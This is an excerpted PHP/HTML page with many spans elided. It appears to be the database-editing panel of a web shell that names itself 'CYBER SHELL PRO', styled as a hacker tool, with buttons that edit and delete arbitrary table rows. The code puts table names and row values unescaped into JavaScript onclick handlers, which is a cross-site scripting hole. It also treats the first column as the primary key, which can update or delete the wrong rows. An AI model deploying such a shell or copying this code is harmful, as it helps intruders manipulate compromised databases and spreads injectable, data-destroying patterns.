...
<body>
                        ...
                        <div class="row">
                            ...
                            <div class="col-md-9">
                                <div id="dbMainContent">
                                    <?php if ($currentDatabase && $currentTable): ?>
                                        <!-- Table Data View -->
                                        <div class="hacker-card p-3">
                                                        ...
                                                        <tbody>
                                                            <?php foreach ($tableData['data'] as $row): ?>
                                                                <tr>
                                                                    ...
                                                                    <td>
                                                                        <div class="btn-group btn-group-sm">
                                                                            <button class="btn btn-outline-warning db-action-btn clickable" 
                                                                                    data-bs-toggle="modal" 
                                                                                    data-bs-target="#editRowModal"
                                                                                    onclick="setEditRowData('<?= $currentTable ?>', <?= htmlspecialchars(json_encode($row)) ?>)"
                                                                                    title="Edit Row">
                                                                                <i class="fas fa-edit"></i>
                                                                            </button>
                                                                            <button class="btn btn-outline-danger db-action-btn clickable" 
                                                                                    onclick="deleteRow('<?= $currentTable ?>', '<?= array_keys($row)[0] ?>', '<?= $row[array_keys($row)[0]] ?>')"
                                                                                    title="Delete Row">
                                                                                <i class="fas fa-trash"></i>
                                                                            </button>
                                                                        </div>
    ...
    <div class="modal fade" id="editRowModal" tabindex="-1">
        <div class="modal-dialog modal-lg">
            <div class="modal-content bg-dark text-white">
                <div class="modal-header border-secondary">
                    <h5 class="modal-title"><i class="fas fa-edit"></i> Edit Row</h5>
                    <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                </div>
                <form method="post" id="editRowForm">
                    ...
                    <input type="hidden" name="primary_key" id="editPrimaryKey">
                    <input type="hidden" name="primary_value" id="editPrimaryValue">
                    <input type="hidden" name="db_action" value="update_row">
                    <div class="modal-body" id="editRowFields">
                        <!-- Fields will be populated by JavaScript -->
                    </div>
                    <div class="modal-footer border-secondary">
                        <button type="submit" class="btn btn-outline-success">Update Row</button>
                        <button type="button" class="btn btn-outline-secondary" data-bs-dismiss="modal">Cancel</button>
                    </div>
                </form>
            </div>
    ...
    <script>
        // FIXED EDIT ROW FUNCTION - Now properly loads data
        function setEditRowData(tableName, rowData) {
            console.log('Setting edit data for:', tableName, rowData);
            ...
            // Get first column as primary key (you might want to detect actual primary key)
            const firstKey = Object.keys(rowData)[0];
            document.getElementById('editPrimaryKey').value = firstKey;
            document.getElementById('editPrimaryValue').value = rowData[firstKey];
        ...
        function deleteRow(tableName, primaryKey, primaryValue) {
            if (confirm('Are you sure you want to delete this row?\n' + primaryKey + ' = ' + primaryValue)) {
                // Create a form and submit it to delete the row
        ...
        document.addEventListener('DOMContentLoaded', function() {
            ...
            console.log('🚀 CYBER SHELL PRO - Multi-DB & Fixed Editor Version Ready!');
        });
    </script>
</body>
</html>